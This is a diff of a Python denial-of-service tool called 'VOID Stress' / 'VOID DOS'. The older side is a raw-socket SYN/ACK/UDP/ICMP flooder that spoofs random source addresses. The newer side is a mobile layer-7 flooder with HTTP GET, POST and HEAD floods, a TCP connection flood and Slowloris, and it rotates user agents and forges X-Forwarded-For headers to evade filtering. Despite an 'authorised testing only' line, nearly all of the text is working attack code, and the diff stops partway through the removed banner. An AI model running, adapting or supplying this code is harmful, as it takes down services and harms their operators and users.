@@ -1,922 +1,542 @@
 #!/usr/bin/env python3
 # ══════════════════════════════════════════════════════════════════
-# ##  VOID Stress Test — raw socket packet engine, no hping3
-# ##  Kali Linux / WSL  ·  @lfw.k4rma_
+# ##  VOID Stress — iSH / iOS Edition
+# ##  Layer-7 stress tester  ·  no raw sockets needed
+# ##  @lfw.k4rma_
+# ##  FOR AUTHORISED TESTING OF YOUR OWN INFRASTRUCTURE ONLY
 # ══════════════════════════════════════════════════════════════════
+#
+# Install on iSH:
+#   apk add python3 py3-pip
+#   pip3 install rich requests --break-system-packages
+#   python3 void_stress_ish.py
+#
+# Or let the script auto-install deps on first run.
 
 import subprocess, sys, os
 
-def _ensure_deps():
-    for mod, pkg in [("rich","rich"),("pyfiglet","pyfiglet")]:
+# ── auto-install deps ──────────────────────────────────────────
+def _ensure(mod, pkg):
+    try:
+        __import__(mod)
+        return
+    except ImportError:
+        pass
+    print(f"[*] Installing {pkg}...")
+    cmds = [
+        [sys.executable, "-m", "pip", "install", pkg, "-q"],
+        ["pip3", "install", pkg, "-q"],
+        ["pip",  "install", pkg, "-q"],
+    ]
+    for cmd in cmds:
         try:
-            __import__(mod)
-        except ImportError:
-            print(f"[*] Installing {pkg}...")
-            try:
-                subprocess.check_call(
-                    [sys.executable,"-m","pip","install",pkg,"-q","--break-system-packages"],
-                    stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
-            except subprocess.CalledProcessError:
-                subprocess.check_call(
-                    [sys.executable,"-m","pip","install",pkg,"-q"],
-                    stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
+            subprocess.check_call(cmd,
+                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            return
+        except Exception:
+            continue
+    print(f"[!] Could not install {pkg}.")
+    print(f"    Fix:  apk add py3-pip && pip3 install {pkg}")
+    print(f"    Or just run:  sh ddos.sh")
+    sys.exit(1)
 
-_ensure_deps()
+_ensure("rich",     "rich")
+_ensure("requests", "requests")
 
-import struct, socket, random, threading, time, re, select
+import socket, threading, time, random, string, re
+import requests
+from urllib.parse  import urlparse
 from rich.console  import Console
-from rich.text     import Text
-from rich.align    import Align
 from rich.rule     import Rule
-from rich.panel    import Panel
+from rich.text     import Text
 from rich.table    import Table
 from rich.live     import Live
+from rich.align    import Align
+from rich.panel    import Panel
 from rich          import box
-import pyfiglet
 
 console    = Console()
 stop_event = threading.Event()
 
 # ══════════════════════════════════════════════════════════════════
-# PACKET CRAFTING ENGINE
+# STATS
 # ══════════════════════════════════════════════════════════════════
 
-def _checksum(data: bytes) -> int:
-    """Standard RFC-1071 Internet checksum."""
-    if len(data) % 2:
-        data += b'\x00'
-    s = 0
-    for i in range(0, len(data), 2):
-        s += (data[i] << 8) | data[i + 1]
-    s = (s >> 16) + (s & 0xffff)
-    s += s >> 16
-    return ~s & 0xffff
-
-# Pre-allocated pools — avoids random generation overhead in hot loop
-_IP_POOL   : list = []
-_PORT_POOL : list = []
-
-def _init_pools():
-    global _IP_POOL, _PORT_POOL
-    for _ in range(10_000):
-        a = random.randint(1, 223)
-        while a in (10, 127, 169, 172, 192):
-            a = random.randint(1, 223)
-        _IP_POOL.append(
-            f"{a}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}")
-    _PORT_POOL = [random.randint(1024, 65535) for _ in range(10_000)]
-
-_init_pools()
-
-def _rand_ip()   -> str: return random.choice(_IP_POOL)
-def _rand_port() -> int: return random.choice(_PORT_POOL)
-
-def _ip_header(src_ip: str, dst_ip: str, proto: int, payload_len: int) -> bytes:
-    ihl     = 5
-    ver     = 4
-    tos     = 0
-    tot_len = 20 + payload_len
-    pkt_id  = random.randint(0, 65535)
-    frag    = 0
-    ttl     = random.randint(48, 128)
-    chk     = 0
-    src     = socket.inet_aton(src_ip)
-    dst     = socket.inet_aton(dst_ip)
-    hdr = struct.pack('!BBHHHBBH4s4s',
-        (ver << 4) | ihl, tos, tot_len,
-        pkt_id, frag, ttl, proto, chk, src, dst)
-    chk = _checksum(hdr)
-    return struct.pack('!BBHHHBBH4s4s',
-        (ver << 4) | ihl, tos, tot_len,
-        pkt_id, frag, ttl, proto, chk, src, dst)
-
-# TCP flag constants
-F_SYN = 0x002
-F_ACK = 0x010
-F_RST = 0x004
-F_FIN = 0x001
-F_PSH = 0x008
-
-def _tcp_segment(src_ip: str, dst_ip: str,
-                 sport: int, dport: int, flags: int) -> bytes:
-    seq    = random.randint(0, 2**32 - 1)
-    ack_n  = 0
-    doff   = 5
-    win    = random.randint(1024, 65535)
-    chk    = 0
-    urg    = 0
-    off    = (doff << 4) | 0
-    seg = struct.pack('!HHIIBBHHH',
-        sport, dport, seq, ack_n, off, flags, win, chk, urg)
-    src = socket.inet_aton(src_ip)
-    dst = socket.inet_aton(dst_ip)
-    pseudo = struct.pack('!4s4sBBH', src, dst, 0, 6, len(seg))
-    chk = _checksum(pseudo + seg)
-    return struct.pack('!HHIIBBHHH',
-        sport, dport, seq, ack_n, off, flags, win, chk, urg)
-
-def _udp_segment(src_ip: str, dst_ip: str,
-                 sport: int, dport: int) -> bytes:
-    data   = random.randbytes(random.randint(16, 512))
-    length = 8 + len(data)
-    chk    = 0
-    seg = struct.pack('!HHHH', sport, dport, length, chk) + data
-    src = socket.inet_aton(src_ip)
-    dst = socket.inet_aton(dst_ip)
-    pseudo = struct.pack('!4s4sBBH', src, dst, 0, 17, length)
-    chk = _checksum(pseudo + seg[:8] + data)
-    return struct.pack('!HHHH', sport, dport, length, chk) + data
-
-def _icmp_packet() -> bytes:
-    type_   = 8   # echo request
-    code    = 0
-    chk     = 0
-    id_     = random.randint(0, 65535)
-    seq     = random.randint(0, 65535)
-    payload = random.randbytes(56)
-    hdr = struct.pack('!BBHHH', type_, code, chk, id_, seq)
-    chk = _checksum(hdr + payload)
-    return struct.pack('!BBHHH', type_, code, chk, id_, seq) + payload
-
-def _build_packet(mode_key: str, src_ip: str, dst_ip: str,
-                  sport: int, dport: int) -> bytes:
-    if mode_key == "SYN":
-        tcp = _tcp_segment(src_ip, dst_ip, sport, dport, F_SYN)
-        return _ip_header(src_ip, dst_ip, 6, len(tcp)) + tcp
-    elif mode_key == "ACK":
-        tcp = _tcp_segment(src_ip, dst_ip, sport, dport, F_ACK)
-        return _ip_header(src_ip, dst_ip, 6, len(tcp)) + tcp
-    elif mode_key == "UDP":
-        udp = _udp_segment(src_ip, dst_ip, sport, dport)
-        return _ip_header(src_ip, dst_ip, 17, len(udp)) + udp
-    elif mode_key == "ICMP":
-        icmp = _icmp_packet()
-        return _ip_header(src_ip, dst_ip, 1, len(icmp)) + icmp
-    return b''
-
-# ══════════════════════════════════════════════════════════════════
-# SHARED STATS (thread-safe)
-# ══════════════════════════════════════════════════════════════════
+import errno as _errno
 
 class Stats:
     def __init__(self):
         self._lock    = threading.Lock()
         self.sent     = 0
-        self.replies  = 0
-        self.errors   = 0
-        self.last_flag= ""
-        self._history : list[tuple[float,int]] = []  # (timestamp, sent)
-        self.start    = time.time()
+        self.success  = 0
+        self.n_refused = 0   # ECONNREFUSED — packet reached server (flood working)
+        self.n_timeout = 0   # timeout      — dropped / overwhelmed
+        self.n_error   = 0   # other
+        self.bytes    = 0
+        self._t0      = time.time()
 
-    def add_sent(self, n: int = 1):
+    def ok(self, nbytes: int = 0):
         with self._lock:
-            self.sent += n
-            now = time.time()
-            self._history.append((now, self.sent))
-            # keep last 3 seconds of data
-            cutoff = now - 3.0
-            self._history = [(t, s) for t, s in self._history if t >= cutoff]
+            self.sent     += 1
+            self.success  += 1
+            self.bytes    += nbytes
 
-    def add_reply(self, flag_str: str = ""):
+    def add_exc(self, exc: Exception):
+        code = getattr(exc, "errno", None)
         with self._lock:
-            self.replies += 1
-            if flag_str:
-                self.last_flag = flag_str
+            self.sent += 1
+            if code in (_errno.ECONNREFUSED, _errno.ECONNRESET):
+                self.n_refused += 1
+            elif isinstance(exc, (TimeoutError, socket.timeout, OSError)) and \
+                 code in (_errno.ETIMEDOUT, None):
+                self.n_timeout += 1
+            else:
+                self.n_error += 1
 
-    def add_error(self):
+    def snap(self):
         with self._lock:
-            self.errors += 1
-
-    def pps(self) -> float:
-        """Rolling 3-second packets-per-second rate."""
-        with self._lock:
-            if len(self._history) < 2:
-                elapsed = time.time() - self.start
-                return self.sent / elapsed if elapsed else 0
-            oldest_t, oldest_s = self._history[0]
-            newest_t, newest_s = self._history[-1]
-            dt = newest_t - oldest_t
-            if dt <= 0:
-                return 0
-            return (newest_s - oldest_s) / dt
-
-    def snapshot(self):
-        with self._lock:
+            elapsed = max(time.time() - self._t0, 0.001)
             return {
-                "sent":      self.sent,
-                "replies":   self.replies,
-                "errors":    self.errors,
-                "last_flag": self.last_flag,
-                "elapsed":   time.time() - self.start,
+                "sent":     self.sent,
+                "success":  self.success,
+                "refused":  self.n_refused,
+                "timeout":  self.n_timeout,
+                "errors":   self.n_error,
+                "bytes":    self.bytes,
+                "elapsed":  elapsed,
+                "pps":      self.sent / elapsed,
+                "bps":      self.bytes / elapsed,
             }
 
 # ══════════════════════════════════════════════════════════════════
-# SENDER THREAD
+# USER-AGENTS & PATHS
 # ══════════════════════════════════════════════════════════════════
 
-def _build_pool(mode_key: str, target_ip: str, target_port: int, size: int) -> list:
-    """Pre-build a pool of raw packets — eliminates struct/checksum overhead in hot loop."""
-    pool = []
-    for _ in range(size):
-        pool.append(_build_packet(mode_key, _rand_ip(), target_ip, _rand_port(), target_port))
-    return pool
+_AGENTS = [
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
+    "Mozilla/5.0 (Android 14; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0",
+    "curl/8.6.0",
+    "python-requests/2.31.0",
+    "Go-http-client/1.1",
+    "Dalvik/2.1.0 (Linux; U; Android 14)",
+]
 
-def _http_sender(target_ip: str, target_port: int, stats: Stats):
-    """Layer 7 HTTP flood — opens real TCP connections and sends GET requests."""
-    # Pre-craft HTTP requests with randomized User-Agent / path to avoid trivial filtering
-    agents = [
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
-    ]
-    paths = ["/", "/index.html", "/api", "/login", "/home", "/search"]
+_PATHS = [
+    "/", "/index.html", "/index.php", "/home", "/api", "/search",
+    "/login", "/admin", "/wp-login.php", "/robots.txt",
+    "/sitemap.xml", "/favicon.ico", "/api/v1/status", "/health",
+    "/static/main.js", "/assets/style.css",
+]
 
+_REFERERS = [
+    "https://google.com/", "https://bing.com/", "https://duckduckgo.com/",
+    "https://twitter.com/", "https://reddit.com/", "https://t.co/",
+]
+
+def _rand_str(n=8):
+    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))
+
+def _headers(host: str) -> dict:
+    return {
+        "Host":            host,
+        "User-Agent":      random.choice(_AGENTS),
+        "Accept":          "text/html,application/xhtml+xml,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Accept-Encoding": "gzip, deflate",
+        "Referer":         random.choice(_REFERERS),
+        "Cache-Control":   "no-cache",
+        "Pragma":          "no-cache",
+        "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}",
+        "X-Real-IP":       f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}",
+    }
+
+# ══════════════════════════════════════════════════════════════════
+# FLOOD WORKERS
+# ══════════════════════════════════════════════════════════════════
+
+def _worker_http_get(target: str, port: int, host: str, stats: Stats):
+    """Mode 1 — HTTP GET flood"""
+    url_base = f"{'https' if port == 443 else 'http'}://{target}:{port}"
     while not stop_event.is_set():
         try:
+            path   = random.choice(_PATHS)
+            buster = f"?v={_rand_str()}&t={int(time.time())}"
+            r = requests.get(
+                f"{url_base}{path}{buster}", headers=_headers(host),
+                timeout=4, allow_redirects=False, stream=False)
+            stats.ok(len(r.content))
+        except Exception as e:
+            stats.add_exc(e)
+
+def _worker_http_post(target: str, port: int, host: str, stats: Stats):
+    """Mode 2 — HTTP POST flood with random body"""
+    url_base = f"{'https' if port == 443 else 'http'}://{target}:{port}"
+    while not stop_event.is_set():
+        try:
+            path = random.choice(_PATHS)
+            body = {_rand_str(): _rand_str(16) for _ in range(8)}
+            r = requests.post(
+                f"{url_base}{path}", headers=_headers(host),
+                data=body, timeout=4, allow_redirects=False)
+            stats.ok(len(r.content))
+        except Exception as e:
+            stats.add_exc(e)
+
+def _worker_tcp_connect(target: str, port: int, stats: Stats):
+    """Mode 3 — TCP connection flood (no raw sockets)"""
+    while not stop_event.is_set():
+        s = None
+        try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(4.0)
-            s.connect((target_ip, target_port))
-            req = (
-                f"GET {random.choice(paths)} HTTP/1.1\r\n"
-                f"Host: {target_ip}\r\n"
-                f"User-Agent: {random.choice(agents)}\r\n"
-                f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
-                f"Accept-Language: en-US,en;q=0.5\r\n"
-                f"Connection: keep-alive\r\n\r\n"
+            s.settimeout(3)
+            s.connect((target, port))
+            s.sendall(b"GET / HTTP/1.1\r\n")
+            time.sleep(random.uniform(0.1, 0.4))
+            stats.ok(18)
+        except Exception as e:
+            stats.add_exc(e)
+        finally:
+            if s:
+                try: s.close()
+                except Exception: pass
+
+def _worker_slowloris(target: str, port: int, host: str, stats: Stats):
+    """Mode 4 — Slowloris: hold connections open with partial headers"""
+    sockets = []
+    while not stop_event.is_set():
+        while len(sockets) < 50 and not stop_event.is_set():
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(4)
+                s.connect((target, port))
+                s.sendall((
+                    f"GET /?{_rand_str()} HTTP/1.1\r\n"
+                    f"Host: {host}\r\n"
+                    f"User-Agent: {random.choice(_AGENTS)}\r\n"
+                    f"Accept-language: en-US,en;q=0.9\r\n"
+                ).encode())
+                sockets.append(s)
+                stats.ok()
+            except Exception:
+                stats.err()
+
+        dead = []
+        for s in sockets:
+            try:
+                s.sendall(f"X-Keep: {_rand_str()}\r\n".encode())
+                stats.ok(20)
+            except Exception as e:
+                dead.append(s)
+                stats.add_exc(e)
+
+        for s in dead:
+            try: s.close()
+            except Exception: pass
+            sockets.remove(s)
+
+        time.sleep(10)
+
+    for s in sockets:
+        try: s.close()
+        except Exception: pass
+
+def _worker_http_head(target: str, port: int, host: str, stats: Stats):
+    """Mode 5 — HTTP HEAD flood (ultra-lightweight, max req/s)"""
+    url_base = f"{'https' if port == 443 else 'http'}://{target}:{port}"
+    sess = requests.Session()
+    while not stop_event.is_set():
+        try:
+            path = random.choice(_PATHS)
+            r = sess.head(
+                f"{url_base}{path}?{_rand_str()}",
+                headers=_headers(host), timeout=3,
+                allow_redirects=False)
+            stats.ok(len(str(r.headers)))
+        except Exception as e:
+            stats.add_exc(e)
+            sess = requests.Session()
+
+def _worker_raw_tcp(target: str, port: int, host: str, stats: Stats):
+    """Mode 6 — Hand-crafted HTTP over raw socket (bypasses requests overhead)"""
+    while not stop_event.is_set():
+        s = None
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(3)
+            s.connect((target, port))
+            path    = random.choice(_PATHS)
+            payload = (
+                f"GET {path}?{_rand_str()} HTTP/1.1\r\n"
+                f"Host: {host}\r\n"
+                f"User-Agent: {random.choice(_AGENTS)}\r\n"
+                f"Accept: */*\r\n"
+                f"X-Forwarded-For: {random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}\r\n"
+                f"Connection: close\r\n\r\n"
             ).encode()
-            s.sendall(req)
-            stats.add_sent(1)
-            # Try to read a tiny response to confirm reply
-            try:
-                data = s.recv(1024)
-                if data:
-                    stats.add_reply("HTTP 200/OK")
-            except socket.timeout:
-                pass
-            s.close()
-        except Exception:
-            stats.add_error()
-            time.sleep(0.001)
-
-def _sender(target_ip: str, target_port: int, mode_key: str, stats: Stats):
-    if mode_key == "HTTP":
-        _http_sender(target_ip, target_port, stats)
-        return
-
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, SOCKET_BUF_SIZE)
-        sock.setsockopt(socket.IPPROTO_IP, socket.IP_TOS, 0x10)  # low delay
-        sock.setblocking(False)
-
-        dst   = (target_ip, 0)
-        pool  = _build_pool(mode_key, target_ip, target_port, POOL_SIZE)
-        idx   = 0
-        batch = 0
-        total = 0
-
-        while not stop_event.is_set():
-            try:
-                sock.sendto(pool[idx], dst)
-                idx   = (idx + 1) % POOL_SIZE
-                batch += 1
-                total += 1
-
-                if batch >= BATCH_REPORT:
-                    stats.add_sent(batch)
-                    batch = 0
-
-                # Refresh pool every 50k sends — keeps IPs varied
-                if total % (POOL_SIZE * 50) == 0:
-                    pool = _build_pool(mode_key, target_ip, target_port, POOL_SIZE)
-                    idx  = 0
-
-                # Yield CPU every 1000 packets — prevents system freeze
-                if total % 1000 == 0:
-                    time.sleep(0)
-
-            except BlockingIOError:
-                if batch:
-                    stats.add_sent(batch)
-                    batch = 0
-                continue
-            except OSError:
-                stats.add_error()
-                continue
-            except Exception:
-                continue
-
-        if batch:
-            stats.add_sent(batch)
-        sock.close()
-
-    except PermissionError:
-        console.print("\n  [bold red][!][/]  Raw sockets need root — run with sudo\n")
-        stop_event.set()
-    except Exception as e:
-        stats.add_error()
+            s.sendall(payload)
+            resp = s.recv(512)
+            stats.ok(len(resp))
+        except Exception as e:
+            stats.add_exc(e)
+        finally:
+            if s:
+                try: s.close()
+                except Exception: pass
 
 # ══════════════════════════════════════════════════════════════════
-# REPLY LISTENER THREAD
+# MODES TABLE
 # ══════════════════════════════════════════════════════════════════
-
-def _listener(target_ip: str, target_port: int, mode_key: str, stats: Stats):
-    if mode_key == "HTTP":
-        return  # HTTP mode already counts replies inside _http_sender
-
-    try:
-        if mode_key in ("SYN", "ACK"):
-            proto = socket.IPPROTO_TCP
-        else:
-            proto = socket.IPPROTO_ICMP
-
-        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, proto)
-        sock.setblocking(False)
-
-        while not stop_event.is_set():
-            try:
-                # select with 1ms timeout — non-blocking, no CPU spin
-                ready, _, _ = select.select([sock], [], [], 0.001)
-                if not ready:
-                    continue
-
-                pkt, addr = sock.recvfrom(65535)
-
-                # DO NOT filter by addr[0] == target_ip
-                # CDN/Cloudflare/WAF reply from DIFFERENT edge IPs — strict IP filter = 0 replies
-                # Only skip localhost noise
-                if addr[0] in ("127.0.0.1", "0.0.0.0"):
-                    continue
-
-                if proto == socket.IPPROTO_TCP:
-                    ip_ihl = (pkt[0] & 0x0f) * 4
-                    if len(pkt) < ip_ihl + 20:
-                        continue
-                    tcph     = struct.unpack('!HHIIBBHHH', pkt[ip_ihl:ip_ihl+20])
-                    src_port = tcph[0]
-                    flags    = tcph[5]
-                    # Reply comes FROM target_port back to us
-                    if src_port != target_port:
-                        continue
-                    stats.add_reply(_decode_tcp_flags(flags))
-
-                elif proto == socket.IPPROTO_ICMP:
-                    ip_ihl    = (pkt[0] & 0x0f) * 4  # correct offset, not hardcoded 20
-                    if len(pkt) < ip_ihl + 1:
-                        continue
-                    icmp_type = pkt[ip_ihl]
-                    if icmp_type == 0:
-                        stats.add_reply("ECHO REPLY")
-                    elif icmp_type == 3:
-                        stats.add_reply("PORT UNREACH")
-                    elif icmp_type == 11:
-                        stats.add_reply("TTL EXCEED")
-
-            except BlockingIOError:
-                continue
-            except Exception:
-                continue
-        sock.close()
-    except Exception:
-        pass
-
-def _decode_tcp_flags(flags: int) -> str:
-    parts = []
-    if flags & F_SYN: parts.append("SYN")
-    if flags & F_ACK: parts.append("ACK")
-    if flags & F_RST: parts.append("RST")
-    if flags & F_FIN: parts.append("FIN")
-    if flags & F_PSH: parts.append("PSH")
-    return "+".join(parts) if parts else f"0x{flags:02x}"
-
-def _flag_meaning(flag_str: str) -> str:
-    if "RST" in flag_str and "ACK" in flag_str: return "Port closed / server rejected"
-    if "SYN" in flag_str and "ACK" in flag_str: return "Port OPEN — server responded"
-    if "RST" in flag_str:                        return "Connection reset by server"
-    if "ACK" in flag_str:                        return "Server acknowledged"
-    if "ECHO" in flag_str:                       return "ICMP echo reply — server alive"
-    if "UNREACH" in flag_str:                    return "Port unreachable (UDP closed)"
-    return flag_str
-
-# ══════════════════════════════════════════════════════════════════
-# LIVE DASHBOARD (Rich)
-# ══════════════════════════════════════════════════════════════════
-
-def _bar(ratio: float, width: int = 28, col: str = "bright_red") -> Text:
-    filled = max(0, min(int(ratio * width), width))
-    b = Text()
-    b.append("█" * filled,          style=col)
-    b.append("░" * (width - filled), style="dim")
-    return b
-
-def _make_dashboard(target: str, port: int, mode: dict,
-                    stats: Stats, n_threads: int) -> Panel:
-    snap   = stats.snapshot()
-    pps    = stats.pps()
-    sent   = snap["sent"]
-    reps   = snap["replies"]
-    errs   = snap["errors"]
-    elap   = snap["elapsed"]
-    last_f = snap["last_flag"]
-
-    loss = ((sent - reps) / sent * 100) if sent else 100.0
-
-    rate_ratio  = min(pps / 100_000, 1.0)
-    reply_ratio = min(reps / max(sent, 1), 1.0)
-
-    col    = mode["color"]
-    label  = mode["label"]
-
-    t = Table.grid(padding=(0, 2))
-    t.add_column()
-    t.add_column()
-    t.add_column()
-    t.add_column()
-
-    t.add_row(
-        Text("TARGET",  style="dim"),
-        Text(f"{target}:{port}", style="bold yellow"),
-        Text("MODE",    style="dim"),
-        Text(label,     style=f"bold {col}"),
-    )
-    t.add_row(
-        Text("SENT",    style="dim"),
-        Text(f"{sent:,}",        style="bold white"),
-        Text("RATE",    style="dim"),
-        Text(f"{pps:,.0f} pps",  style="bold bright_red"),
-    )
-    t.add_row(
-        Text("REPLIES", style="dim"),
-        Text(f"{reps:,}", style="bold bright_green"),
-        Text("LOSS",    style="dim"),
-        Text(f"{loss:.1f}%",
-             style="bright_green" if loss < 20 else ("yellow" if loss < 60 else "bright_red")),
-    )
-    t.add_row(
-        Text("THREADS", style="dim"),
-        Text(f"{n_threads} active", style="bold white"),
-        Text("UP",      style="dim"),
-        Text(f"{elap:.0f}s",  style="bold white"),
-    )
-
-    # Rate bar
-    rate_row = Text()
-    rate_row.append("  RATE   ", style="bold white")
-    rate_row.append_text(_bar(rate_ratio, col=col))
-    rate_row.append(f"  {pps:,.0f} pps", style=f"bold {col}")
-
-    # Reply bar
-    rep_row = Text()
-    rep_row.append("  REPLY  ", style="bold white")
-    rep_row.append_text(_bar(reply_ratio, col="bright_green"))
-    rep_row.append(f"  {reps:,}", style="bold bright_green")
-
-    # Last reply
-    last_row = Text()
-    if last_f:
-        meaning = _flag_meaning(last_f)
-        last_row.append("  LAST   ", style="bold white")
-        last_row.append(f"{last_f}  ", style="bold yellow")
-        last_row.append(f"→ {meaning}", style="dim")
-    else:
-        last_row.append("  LAST   ", style="bold white")
-        last_row.append("waiting for reply...", style="dim")
-
-    body = Text()
-    body.append("\n")
-    body.append_text(Text.assemble(("  ", ""), t.__rich_console__(console, console.options).__next__())) # fallback
-    body.append("\n")
-
-    # Compose panel content as a group
-    from rich.console import Group
-    content = Group(
-        t,
-        Text(""),
-        rate_row,
-        rep_row,
-        last_row,
-        Text(""),
-        Text("  [Ctrl+C to stop]", style="dim red"),
-    )
-
-    return Panel(
-        content,
-        title=f"[bold bright_red]  VOID STRESS TEST  —  ∞ INFINITE  [/]",
-        border_style="bright_red",
-        box=box.DOUBLE_EDGE,
-    )
-
-# ══════════════════════════════════════════════════════════════════
-# GEOGRAPHIC ATTACK MAP
-# ══════════════════════════════════════════════════════════════════
-
-MAP_LINES = [
-    "                                                                                  ",
-    "       ┌───────────┐          ┌────────┐   ┌─────────────────────────┐  ┌─────┐  ",
-    "       │           │          │        │   │                         │  │     │  ",
-    "       │  N.AMER   │          │ EUROPE │   │         A S I A         │  │ JAP │  ",
-    "       │           │          │        │   │                         │  └─────┘  ",
-    "       │           │          └────────┘   │                         │           ",
-    "       └───────────┘                       └─────────────────────────┘           ",
-    "                                                                                  ",
-    "       ┌───────────┐     ┌──────────┐                          ┌──────────────┐  ",
-    "       │           │     │          │                          │              │  ",
-    "       │  S.AMER   │     │  AFRICA  │                          │   OCEANIA    │  ",
-    "       │           │     │          │                          │              │  ",
-    "       └───────────┘     └──────────┘                          └──────────────┘  ",
-    "                                                                                  ",
-    "                                                                                  ",
-    "                                                                                  ",
-]
-
-# (row, col, region_key)
-ATTACK_NODES = [
-    (2, 10, "NAM"), (3, 14, "NAM"), (4,  8, "NAM"), (5, 12, "NAM"),
-    (9,  9, "SAM"), (10,13, "SAM"), (11,  8,"SAM"),
-    (2, 30, "EU"),  (3, 33, "EU"),  (4, 28, "EU"),
-    (9, 27, "AFR"), (10,31, "AFR"), (11,25, "AFR"),
-    (2, 46, "ASIA"),(3, 50, "ASIA"),(4, 43, "ASIA"),(5, 48, "ASIA"),
-    (2, 62, "JAP"), (3, 64, "JAP"),
-    (9, 58, "OCE"), (10,62, "OCE"), (11,55, "OCE"),
-]
-
-REGION_ORDER  = ["NAM","EU","ASIA","JAP","SAM","AFR","OCE"]
-REGION_LABELS = {
-    "NAM": "North America", "EU":  "Europe",
-    "ASIA":"Asia",          "JAP": "Japan / Korea",
-    "SAM": "South America", "AFR": "Africa",
-    "OCE": "Oceania",
-}
-
-def _render_map(active: set) -> Text:
-    grid = [list(row) for row in MAP_LINES]
-    node_positions: dict[tuple,bool] = {}
-    for row, col, region in ATTACK_NODES:
-        node_positions[(row, col)] = region in active
-
-    txt = Text()
-    for r, row in enumerate(grid):
-        for c, ch in enumerate(row):
-            if (r, c) in node_positions:
-                if node_positions[(r, c)]:
-                    txt.append("◉", style="bold bright_red")
-                else:
-                    txt.append("·", style="dim red")
-            elif ch in "┌┐└┘─│":
-                txt.append(ch, style="dim red")
-            else:
-                txt.append(ch, style="dim white")
-        txt.append("\n")
-    return txt
-
-def show_geo_attack_map(target: str, mode_label: str, mode_color: str):
-    console.print()
-    console.print(Rule("[bold bright_red]  GLOBAL ATTACK NETWORK  [/]", style="bright_red"))
-    console.print()
-    console.print(f"  [dim]Deploying nodes across[/] [bold bright_red]7 regions[/] "
-                  f"[dim]— target:[/] [bold yellow]{target}[/]")
-    console.print()
-
-    active: set = set()
-    MAP_HEIGHT = len(MAP_LINES)
-
-    for i, region in enumerate(REGION_ORDER):
-        active.add(region)
-        n = sum(1 for _, _, r in ATTACK_NODES if r == region)
-        console.print(f"  [bright_red]▶[/]  [bold white]{REGION_LABELS[region]:<16}[/]  "
-                      f"[bright_red]{n} nodes[/]  [bold bright_green][ ONLINE ][/]")
-        map_txt = _render_map(active)
-        console.print(Align.center(map_txt))
-        time.sleep(0.5)
-        if region != REGION_ORDER[-1]:
-            sys.stdout.write(f"\033[{MAP_HEIGHT + 1}A")
-            sys.stdout.flush()
-
-    console.print()
-    console.print(Rule("[dim red]  CONVERGENCE  [/]", style="dim red"))
-    console.print()
-    frames = [
-        f"  [dim red]·  ·  ·  ·  ·  ·  ·  ·  ·  ·[/]  [bold yellow]◎ {target}[/]  [dim red]·  ·  ·  ·  ·  ·  ·  ·  ·  ·[/]",
-        f"  [red]──  ──  ──  ──  ──  ──  ──[/]  [bold yellow]◎ {target}[/]  [red]──  ──  ──  ──  ──  ──  ──[/]",
-        f"  [bright_red]━━━━━━━━━━━━━━━━━━━━━━━━━━[/]  [bold yellow]◎ {target}[/]  [bright_red]━━━━━━━━━━━━━━━━━━━━━━━━━━[/]",
-        f"  [bold bright_red]█████████████████████████[/]  [bold yellow]◎ {target}[/]  [bold bright_red]█████████████████████████[/]",
-    ]
-    for frame in frames:
-        console.print(frame)
-        time.sleep(0.28)
-    console.print()
-    console.print(f"  [bold bright_red][!!!][/]  [bold white]ALL {len(ATTACK_NODES)} NODES LOCKED ON[/]  "
-                  f"[bold yellow]{target}[/]  [bold {mode_color}]— {mode_label.upper()}[/]")
-    console.print()
-    console.print(Rule(style="bright_red"))
-    console.print()
-
-# ══════════════════════════════════════════════════════════════════
-# BANNER & MENUS
-# ══════════════════════════════════════════════════════════════════
-
-def banner():
-    console.clear()
-    fig = pyfiglet.figlet_format("V O I D  D O S", font="doom")
-    txt = Text()
-    shades = ["bright_red","red","bright_red","red","bright_red","red"]
-    for i, line in enumerate(fig.splitlines()):
-        txt.append(line + "\n", style=shades[i % len(shades)])
-    console.print(Align.center(txt))
-    console.print(Align.center(Text(
-        "raw socket engine  ·  no hping3  ·  Kali Linux  ·  @lfw.k4rma_\n",
